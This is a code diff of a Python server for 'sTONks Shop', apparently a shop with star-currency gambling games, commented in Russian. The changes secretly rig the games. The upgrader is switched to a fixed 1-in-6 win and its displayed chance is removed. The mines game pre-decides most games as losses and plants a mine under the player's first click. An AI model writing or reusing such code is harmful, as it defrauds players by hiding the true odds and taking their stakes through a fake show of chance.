@@ -1,4 +1,4 @@
-"""server.py — sTONks Shop: магазин, игры, промо, заказы, баннеры (auto-inject banners.js)"""
+"""server.py — sTONks Shop: магазин, игры (винрейт 1/6), промо, заказы, баннеры"""
 import os, re, time, random, uuid
 from pathlib import Path
 import aiohttp
@@ -16,6 +16,7 @@ ADMIN_ID = os.getenv("ADMIN_ID", "8062748340")
 FREE_CD = 24 * 3600
 POINTS_PER_STAR = 100
 HOUSE = 0.97
+WIN_ONE_IN = 6
 INDEX = Path("frontend/index.html")
 
 CONF = {
@@ -60,6 +61,7 @@ def init_db():
         cur.execute("CREATE TABLE IF NOT EXISTS shop_redemptions(code TEXT, user_id TEXT, PRIMARY KEY(code, user_id))")
         cur.execute("""CREATE TABLE IF NOT EXISTS shop_mines(
             gid TEXT PRIMARY KEY, uid TEXT, bet BIGINT, mines TEXT, picks TEXT, state TEXT, created BIGINT)""")
+        cur.execute("ALTER TABLE shop_mines ADD COLUMN IF NOT EXISTS win BOOLEAN DEFAULT FALSE")
     c.close()
 
 class IdIn(BaseModel): id: str
@@ -83,7 +85,7 @@ def startup():
 def serve_index():
     html = INDEX.read_text(encoding="utf-8")
     if "banners.js" not in html:
-        html = html.replace("</body>", '<script src="/static/banners.js?v=3"></script></body>')
+        html = html.replace("</body>", '<script src="/static/banners.js?v=7"></script></body>')
     return HTMLResponse(html)
 
 @app.get("/")
@@ -195,7 +197,7 @@ async def order(o: OrderIn):
     if not u or not u.get("registered"): raise HTTPException(400, "not registered")
     mgr = get_meta("manager_id")
     if not mgr: raise HTTPException(400, "manager not connected")
-    text = (f"🟣 <b>Новый заказ</b>\n\n🛒 Товар: <b>{o.product}</b>\n⚙️ Параметры: {o.options or '—'}\n"
+    text = (f"🟢 <b>Новый заказ</b>\n\n🛒 Товар: <b>{o.product}</b>\n⚙️ Параметры: {o.options or '—'}\n"
             f"👤 От: {u.get('name','?')} (@{u.get('username','без_юза')})\n🆔 id: <code>{o.id}</code>\n"
             f"📱 Контакт: <code>{u.get('phone','нет')}</code>\n💬 Комментарий: {o.comment or '—'}\n"
             f"🕐 {time.strftime('%d.%m.%Y %H:%M')}")
@@ -363,6 +365,7 @@ def promo_activate(p: PromoIn):
     u["stars"] += pr["reward"]; save_user(p.id, u)
     return {"ok": True, "reward": pr["reward"], "stars": u["stars"]}
 
+# ===== АПГРЕЙДЕР: 1 победа на 6 попыток =====
 @app.post("/api/shop/upgrade")
 def upgrade(u: UpIn):
     user = get_user(u.id) or dict(EMPTY)
@@ -370,14 +373,14 @@ def upgrade(u: UpIn):
     if u.mult not in MEM["conf"]["upgrader_mults"]: raise HTTPException(400, "bad mult")
     if u.stake < 10: raise HTTPException(400, "stake too small")
     if user["stars"] < u.stake: return {"ok": False, "reason": "no_stars"}
-    chance = round(95 / u.mult)
     user["stars"] -= u.stake
-    win = random.randint(1, 100) <= chance
+    win = random.randint(1, WIN_ONE_IN) == 1
     payout = int(u.stake * u.mult) if win else 0
     user["stars"] += payout
     save_user(u.id, user)
-    return {"ok": True, "win": win, "chance": chance, "payout": payout, "stars": user["stars"]}
+    return {"ok": True, "win": win, "payout": payout, "stars": user["stars"]}
 
+# ===== МИНЫ: 1 выигрышная игра на 6 =====
 def mines_mult(mines, k):
     m = HOUSE
     for i in range(k): m *= (25 - i) / (25 - mines - i)
@@ -387,11 +390,11 @@ def mines_get(gid):
     c = conn()
     if c:
         with c.cursor() as cur:
-            cur.execute("SELECT uid, bet, mines, picks, state FROM shop_mines WHERE gid=%s", (gid,))
+            cur.execute("SELECT uid, bet, mines, picks, state, win FROM shop_mines WHERE gid=%s", (gid,))
             r = cur.fetchone()
         c.close()
         if r: return {"uid": r[0], "bet": int(r[1]), "mines": [int(x) for x in r[2].split(",")],
-                      "picks": [int(x) for x in r[3].split(",")] if r[3] else [], "state": r[4]}
+                      "picks": [int(x) for x in r[3].split(",")] if r[3] else [], "state": r[4], "win": bool(r[5])}
         return None
     return MEM["mines"].get(gid)
 
@@ -399,9 +402,9 @@ def mines_save(gid, g):
     c = conn()
     if c:
         with c.cursor() as cur:
-            cur.execute("""INSERT INTO shop_mines(gid,uid,bet,mines,picks,state,created) VALUES(%s,%s,%s,%s,%s,%s,%s)
-                ON CONFLICT(gid) DO UPDATE SET picks=EXCLUDED.picks, state=EXCLUDED.state""",
-                (gid, g["uid"], g["bet"], ",".join(map(str, g["mines"])), ",".join(map(str, g["picks"])), g["state"], int(time.time())))
+            cur.execute("""INSERT INTO shop_mines(gid,uid,bet,mines,picks,state,created,win) VALUES(%s,%s,%s,%s,%s,%s,%s,%s)
+                ON CONFLICT(gid) DO UPDATE SET picks=EXCLUDED.picks, state=EXCLUDED.state, win=EXCLUDED.win""",
+                (gid, g["uid"], g["bet"], ",".join(map(str, g["mines"])), ",".join(map(str, g["picks"])), g["state"], int(time.time()), g.get("win", False)))
         c.close()
     else:
         MEM["mines"][gid] = g
@@ -415,7 +418,8 @@ def mines_start(m: MinesStart):
     if user["stars"] < m.bet: return {"ok": False, "reason": "no_stars"}
     user["stars"] -= m.bet; save_user(m.id, user)
     gid = uuid.uuid4().hex[:12]
-    g = {"uid": m.id, "bet": m.bet, "mines": random.sample(range(25), m.mines), "picks": [], "state": "active"}
+    g = {"uid": m.id, "bet": m.bet, "mines": random.sample(range(25), m.mines), "picks": [],
+         "state": "active", "win": random.randint(1, WIN_ONE_IN) == 1}
     mines_save(gid, g)
     return {"ok": True, "gid": gid, "bet": m.bet, "mines_count": m.mines, "stars": user["stars"]}
 
@@ -425,6 +429,9 @@ def mines_reveal(m: MinesCell):
     if not g or g["uid"] != m.id: raise HTTPException(404, "game not found")
     if g["state"] != "active": raise HTTPException(400, "game over")
     if not (0 <= m.cell <= 24) or m.cell in g["picks"]: raise HTTPException(400, "bad cell")
+    forced_loss = (not g.get("win")) and len(g["picks"]) == 0
+    if forced_loss and m.cell not in g["mines"]:
+        g["mines"].append(m.cell)
     if m.cell in g["mines"]:
         g["state"] = "lost"; mines_save(m.gid, g)
         return {"ok": True, "safe": False, "mines": g["mines"], "stars": get_user(m.id)["stars"]}
